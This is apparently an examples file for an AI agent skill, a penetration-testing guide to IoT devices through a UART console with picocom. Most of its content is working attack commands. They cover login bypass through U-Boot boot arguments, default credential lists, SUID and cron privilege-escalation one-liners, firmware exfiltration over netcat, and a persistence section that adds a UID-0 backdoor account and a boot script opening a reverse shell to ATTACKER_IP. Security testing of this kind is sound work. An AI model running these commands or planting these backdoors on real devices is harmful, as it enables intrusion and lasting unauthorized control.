# IoT UART Console Examples

This file contains practical examples of using the picocom skill for IoT penetration testing.

## Example 1: Basic Connection and Enumeration

**Scenario**: You have a USB-to-serial adapter connected to an unknown IoT device.

**Steps**:

1. **Identify the serial device**:
   ```bash
   # Check for USB serial devices
   ls -l /dev/ttyUSB* /dev/ttyACM*

   # Or use dmesg to see recently connected devices
   dmesg | tail -20
   ```

2. **Connect with picocom**:
   ```bash
   # Start with defaults (115200 baud, /dev/ttyUSB0)
   picocom -b 115200 --nolock --echo --logfile device_session.log /dev/ttyUSB0
   ```

3. **Interact with the device**:
   - Press Enter a few times to see if you get a prompt
   - If you see a login prompt, try default credentials (root/root, admin/admin)
   - If you get a shell, start enumeration

4. **Basic enumeration commands**:
   ```bash
   # Who am I?
   id
   whoami

   # System information
   uname -a
   cat /proc/version

   # Check if using BusyBox (most IoT devices do)
   busybox
   busybox --list

   # Network configuration
   ifconfig -a
   ip addr show

   # Running processes
   ps aux
   ```

5. **BusyBox Detection** (most IoT devices):
   ```bash
   # Most IoT shells use BusyBox - a minimal Unix toolkit
   # Check what you're working with:
   ls -la /bin/sh  # Often symlinked to busybox
   busybox --list  # See available commands

   # Note: BusyBox commands may have limited options compared to full Linux
   # Example: 'ps aux' might work differently or not support all flags
   ```

## Example 2: U-Boot Bootloader Exploitation

**Scenario**: Device has U-Boot bootloader with accessible console during boot.

**Steps**:

1. **Connect and watch boot process**:
   ```bash
   picocom -b 115200 --nolock --echo /dev/ttyUSB0
   ```

2. **Interrupt boot**:
   - Watch for "Hit any key to stop autoboot" message
   - Press Space or Enter quickly to interrupt

3. **Explore U-Boot environment**:
   ```
   U-Boot> printenv
   U-Boot> help
   U-Boot> version
   ```

4. **Modify boot arguments to gain root shell**:
   ```
   U-Boot> setenv bootargs "${bootargs} init=/bin/sh"
   U-Boot> boot
   ```

   Or alternatively:
   ```
   U-Boot> setenv bootargs "${bootargs} single"
   U-Boot> boot
   ```

5. **Once booted with init=/bin/sh**:
   ```bash
   # Mount root filesystem as read-write
   mount -o remount,rw /

   # Mount other filesystems
   mount -a

   # Now you have root access - proceed with enumeration
   ```

## Example 3: Bypassing Login Authentication

**Scenario**: Device boots to a login prompt, but you don't know the credentials.

**Method 1: Bootloader modification (if available)**:
```
# In U-Boot:
setenv bootargs "${bootargs} init=/bin/sh"
boot

# Or try single user mode:
setenv bootargs "${bootargs} single"
boot
```

**Method 2: Default credentials**:
```
# Common IoT default credentials to try:
root : root
root : (empty/no password)
admin : admin
admin : password
admin : (empty)
user : user
support : support
```

**Method 3: Password file examination (if you get any access)**:
```bash
# Check if shadow file is readable (misconfig)
cat /etc/shadow

# Check for plaintext passwords in config files
grep -r "password" /etc/ 2>/dev/null
find / -name "*password*" -type f 2>/dev/null
```

## Example 4: Privilege Escalation from Limited User

**Scenario**: You have shell access but as a limited user, need root.

**Check for SUID binaries**:
```bash
find / -perm -4000 -type f 2>/dev/null
```

Common exploitable SUID binaries:
```bash
# If find has SUID:
find /etc -exec /bin/sh \;

# If vim/vi has SUID:
vim -c ':!/bin/sh'

# If less has SUID:
less /etc/passwd
!/bin/sh

# If python has SUID:
python -c 'import os; os.setuid(0); os.system("/bin/sh")'

# If perl has SUID:
perl -e 'exec "/bin/sh";'
```

**Check sudo permissions**:
```bash
sudo -l

# If you can run specific commands with sudo, abuse them:
# Example: sudo vim -> :!/bin/sh
# Example: sudo find -> sudo find . -exec /bin/sh \;
```

**Check for writable cron jobs**:
```bash
ls -la /etc/cron*
crontab -l
find /etc/cron* -writable 2>/dev/null

# If you can write to a cron job:
echo '* * * * * /bin/sh -c "chmod u+s /bin/sh"' >> /etc/crontab
# Wait a minute, then:
/bin/sh -p  # Runs as root
```

## Example 5: Firmware Extraction

**Scenario**: You have root access and want to extract firmware for offline analysis.

**Step 1: Identify flash partitions**:
```bash
# Check MTD partitions (most common on embedded devices)
cat /proc/mtd

# Example output:
# dev:    size   erasesize  name
# mtd0: 00040000 00010000 "u-boot"
# mtd1: 00010000 00010000 "u-boot-env"
# mtd2: 00140000 00010000 "kernel"
# mtd3: 00e90000 00010000 "rootfs"
```

**Step 2: Dump partitions**:
```bash
# Create mount point for USB storage (if available)
mkdir /mnt/usb
mount /dev/sda1 /mnt/usb

# Dump each partition
dd if=/dev/mtd0 of=/mnt/usb/uboot.bin bs=1024
dd if=/dev/mtd1 of=/mnt/usb/uboot-env.bin bs=1024
dd if=/dev/mtd2 of=/mnt/usb/kernel.bin bs=1024
dd if=/dev/mtd3 of=/mnt/usb/rootfs.bin bs=1024

# Or dump to /tmp and transfer via network
dd if=/dev/mtd3 of=/tmp/rootfs.bin bs=1024

# Transfer via netcat
nc 192.168.1.100 4444 < /tmp/rootfs.bin
# (On attacker machine: nc -l -p 4444 > rootfs.bin)
```

**Step 3: Offline analysis**:
```bash
# On your analysis machine:
# Use binwalk to analyze the firmware
binwalk rootfs.bin

# Extract filesystem
binwalk -e rootfs.bin

# Or use firmware-mod-kit
extract-firmware.sh rootfs.bin

# Look for:
# - Hardcoded credentials
# - Private keys
# - Vulnerable services
# - Backdoors
# - Outdated software versions
```

## Example 6: Establishing Persistence

**Scenario**: You have root access and want to maintain access for further testing.

**Method 1: SSH Access**:
```bash
# Check if SSH/Dropbear is installed
which sshd dropbear

# Start SSH service if not running
/etc/init.d/dropbear start
# or
/etc/init.d/sshd start

# Add your SSH public key
mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo "ssh-rsa AAAAB3NzaC... your_key_here" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Ensure SSH starts on boot
update-rc.d dropbear enable
# or add to /etc/rc.local
```

**Method 2: Backdoor User Account**:
```bash
# Add a user with UID 0 (root equivalent)
echo "backdoor:x:0:0:Backdoor:/root:/bin/sh" >> /etc/passwd

# Set password
passwd backdoor

# Or create user without password
echo "backdoor::0:0:Backdoor:/root:/bin/sh" >> /etc/passwd
```

**Method 3: Reverse Shell on Boot**:
```bash
# Add to startup script
echo '#!/bin/sh' > /etc/init.d/S99backdoor
echo 'while true; do' >> /etc/init.d/S99backdoor
echo '  sleep 300' >> /etc/init.d/S99backdoor
echo '  /bin/sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /etc/init.d/S99backdoor
echo 'done &' >> /etc/init.d/S99backdoor
chmod +x /etc/init.d/S99backdoor
```

## Example 7: Escaping Restricted Shell

**Scenario**: You get shell access but it's a restricted/limited shell.

**Identify the restriction**:
```bash
echo $SHELL
echo $PATH
which bash sh
```

**Common escape techniques**:

1. **Via editors**:
   ```bash
   # Vi/Vim escape
   vi /etc/passwd
   # Press ESC, then type:
   :!/bin/sh

   # Or:
   :set shell=/bin/sh
   :shell
   ```

2. **Via pagers**:
   ```bash
   # Less escape
   less /etc/passwd
   !/bin/sh

   # More escape
   more /etc/passwd
   !/bin/sh
   ```

3. **Via scripting languages**:
   ```bash
   # Python
   python -c 'import os; os.system("/bin/sh")'

   # Perl
   perl -e 'exec "/bin/sh";'

   # Ruby
   ruby -e 'exec "/bin/sh"'

   # Lua
   lua -e 'os.execute("/bin/sh")'
   ```

4. **Via system commands**:
   ```bash
   # Find
   find / -name anything -exec /bin/sh \;

   # Awk
   awk 'BEGIN {system("/bin/sh")}'

   # Sed
   sed -e '1s/.*//' /etc/passwd -e '1i#!/bin/sh' | sh
   ```

5. **Via environment manipulation**:
   ```bash
   # If you can modify PATH
   export PATH=/bin:/usr/bin:/sbin:/usr/sbin

   # If cd is restricted, try:
   cd() { builtin cd "$@"; }
   ```

## Example 8: Network Service Discovery

**Scenario**: Enumerate network services for lateral movement.

```bash
# Check listening ports
netstat -tulpn
ss -tulpn
lsof -i -P -n

# Check network connections
netstat -anp
ss -anp

# Check ARP table (find other devices)
arp -a
cat /proc/net/arp

# Scan local network (if tools available)
nmap -sn 192.168.1.0/24

# Check for common IoT services
ps aux | grep -E 'http|telnet|ftp|ssh|upnp|mqtt'

# Check open files and sockets
lsof | grep -E 'LISTEN|ESTABLISHED'

# Examine web server configs
cat /etc/nginx/nginx.conf
cat /etc/lighttpd/lighttpd.conf
ls -la /var/www/

# Check for credentials in web files
grep -r "password" /var/www/ 2>/dev/null
grep -r "api_key" /var/www/ 2>/dev/null
```

## Tips and Tricks

### Baud Rate Detection
If you see garbled output, systematically try common baud rates:
```bash
# Common rates in order of likelihood:
115200, 57600, 38400, 19200, 9600, 230400, 460800, 921600
```

### Logging Everything
Always log your session for documentation and later analysis:
```bash
picocom -b 115200 --nolock --logfile pentest_$(date +%Y%m%d_%H%M%S).log /dev/ttyUSB0
```

### Multiple Serial Connections
If you need to monitor boot process and interact:
```bash
# Terminal 1: Monitor and log
picocom -b 115200 --nolock --logfile boot.log /dev/ttyUSB0

# Terminal 2: Send commands
echo "command" > /dev/ttyUSB0
```

### Recovering from Broken Console
If console becomes unresponsive:
```bash
# Send Ctrl-C
echo -ne '\003' > /dev/ttyUSB0

# Send Ctrl-D (EOF)
echo -ne '\004' > /dev/ttyUSB0

# Reset terminal
reset
```

### Finding UART Pins on PCB
If you need to locate UART on a device PCB:
1. Look for 3-5 pin headers (usually GND, TX, RX, VCC)
2. Use multimeter to find GND (continuity to ground plane)
3. Power on device and use logic analyzer or multimeter to find TX (data output)
4. RX is usually next to TX
5. Typical voltage: 3.3V or 5V (be careful not to mix!)

## Security Checklist

After gaining access, systematically check:

- [ ] Device identification (model, firmware version)
- [ ] User accounts and permissions
- [ ] Default credentials
- [ ] Network configuration and services
- [ ] Firewall rules
- [ ] Running processes and services
- [ ] Filesystem permissions (SUID, world-writable)
- [ ] Cron jobs and startup scripts
- [ ] Hardcoded credentials in files
- [ ] SSH keys and certificates
- [ ] Web interfaces and APIs
- [ ] Known CVEs for installed software
- [ ] Bootloader security
- [ ] Firmware extraction
- [ ] Backdoor installation possibilities
- [ ] Lateral movement opportunities
- [ ] Data exfiltration vectors

## Common Vulnerabilities Found in IoT Devices

1. **Default Credentials**: Many devices ship with unchanged default passwords
2. **Hardcoded Credentials**: Passwords embedded in firmware
3. **Weak Authentication**: No password or easily guessable passwords
4. **Insecure Services**: Telnet, FTP running with root access
5. **Outdated Software**: Old kernel versions with known exploits
6. **SUID Misconfiguration**: Unnecessary SUID binaries
7. **World-Writable Files**: Critical system files with wrong permissions
8. **Unsecured Bootloader**: U-Boot without password protection
9. **No Firmware Signature Verification**: Can flash custom firmware
10. **Information Disclosure**: Verbose error messages, exposed configs
